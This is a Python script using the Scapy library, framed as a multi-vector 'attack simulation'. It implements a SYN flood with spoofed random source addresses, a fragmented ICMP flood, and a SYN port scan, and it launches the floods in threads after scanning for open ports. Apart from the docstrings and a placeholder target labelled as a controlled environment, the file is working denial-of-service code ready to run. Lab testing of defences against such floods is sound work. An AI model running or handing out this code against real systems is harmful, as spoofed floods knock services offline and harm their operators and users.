from scapy.all import *
import random
import time
import threading

def random_ip():
    """Generate a random IP address."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_delay(min_delay=0.1, max_delay=1.0):
    """Introduce a random delay to simulate more realistic network behavior."""
    time.sleep(random.uniform(min_delay, max_delay))

def syn_flood(target_ip, target_port, num_packets):
    """Simulate a SYN flood attack with randomized timing."""
    for _ in range(num_packets):
        ip_layer = IP(src=random_ip(), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        send(ip_layer/tcp_layer, verbose=0)
        random_delay()

def icmp_flood(target_ip, num_packets):
    """Simulate an ICMP flood with packet fragmentation."""
    for _ in range(num_packets):
        ip_layer = IP(src=random_ip(), dst=target_ip)
        icmp_layer = ICMP()/"X"*600  # Large payload to force fragmentation
        send(fragment(ip_layer/icmp_layer), verbose=0)
        random_delay()

def port_scan(target_ip, start_port, end_port):
    """Perform a simple TCP port scan and return list of open ports."""
    open_ports = []
    for port in range(start_port, end_port + 1):
        resp = sr1(IP(dst=target_ip)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
        if resp and resp.haslayer(TCP) and resp.getlayer(TCP).flags & 0x12:  # SYN/ACK
            open_ports.append(port)
            send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)  # Send RST to close
    return open_ports

def attack_simulation(target_ip):
    """Run a multi-vector attack simulation with adaptive behavior."""
    # Initial port scan to adapt further actions
    print("Scanning for open ports...")
    open_ports = port_scan(target_ip, 70, 85)
    print(f"Open ports found: {open_ports}")

    # Simulate attacks based on scan results
    if 80 in open_ports:
        print("Launching SYN flood on port 80...")
        threading.Thread(target=syn_flood, args=(target_ip, 80, 100)).start()

    if open_ports:
        print("Launching ICMP flood...")
        threading.Thread(target=icmp_flood, args=(target_ip, 100)).start()

    # Note: DNS amplification and ARP spoofing are complex and require specific conditions to simulate effectively

# Example usage
if __name__ == "__main__":
    target_ip = "192.168.1.XXX"  # Replace with your target IP in the controlled environment
    attack_simulation(target_ip)
